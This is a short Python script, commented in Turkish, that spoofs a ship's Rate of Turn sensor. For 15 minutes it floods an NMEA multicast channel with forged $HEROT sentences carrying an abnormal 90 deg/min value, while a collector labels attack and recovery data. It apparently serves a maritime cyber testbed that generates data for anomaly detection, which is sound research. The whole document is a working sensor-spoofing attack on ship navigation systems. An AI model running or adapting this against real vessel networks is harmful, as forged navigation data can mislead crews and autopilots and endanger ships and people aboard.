#!/usr/bin/env python3
"""
T0856 - Sensor Spoofing: Rate of Turn (ROT) Injection
NMEA ROT sentence'a anormal değer inject et.
Normal ROT: -10 ile +10 derece/dk arası
Saldırı: 90.0 derece/dk inject — gemi döndüğü hissini verir ama heading değişmez
MITRE: T0856 - Unauthorized Command / Sensor Spoofing
"""
import socket, time, subprocess

DURATION = 900
RECOVERY = 120
NMEA_HOST = "239.0.1.1"
NMEA_PORT = 10110
OUTPUT = "/root/MaCySTe/grad_rl_data/attack_data.csv"
COLLECTOR = "/root/MaCySTe/macyste_collector.py"
ROT_VALUE = 90.0  # anormal: normal max ~10


def nmea_checksum(sentence):
    cs = 0
    for c in sentence:
        cs ^= ord(c)
    return f"{cs:02X}"


def run_collector(label, duration):
    cmd = ["python3", COLLECTOR, "--label", label,
           "--duration", str(duration), "--output", OUTPUT, "--append"]
    print(f"[COLLECTOR] label={label} duration={duration}s")
    return subprocess.Popen(cmd)


print(f"[T0856-ROT] Rate of Turn Spoofing {ROT_VALUE} deg/min basliyor...")
collector = run_collector("t0856_rot_spoof", DURATION)

end_time = time.time() + DURATION
count = 0

with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)
    while time.time() < end_time:
        body = f"$HEROT,{ROT_VALUE:.1f},A"
        cs = nmea_checksum(body[1:])
        pkt = (body + f"*{cs}\r\n").encode('ascii')
        sock.sendto(pkt, (NMEA_HOST, NMEA_PORT))
        count += 1
        time.sleep(1.0)
        if count % 60 == 0:
            print(f"[ATTACK] {count} paket, kalan={int(end_time-time.time())}s")

collector.wait()
print(f"[RECOVERY] {RECOVERY}s...")
run_collector("recovery", RECOVERY).wait()
print(f"[DONE] {count} ROT paket gonderildi")
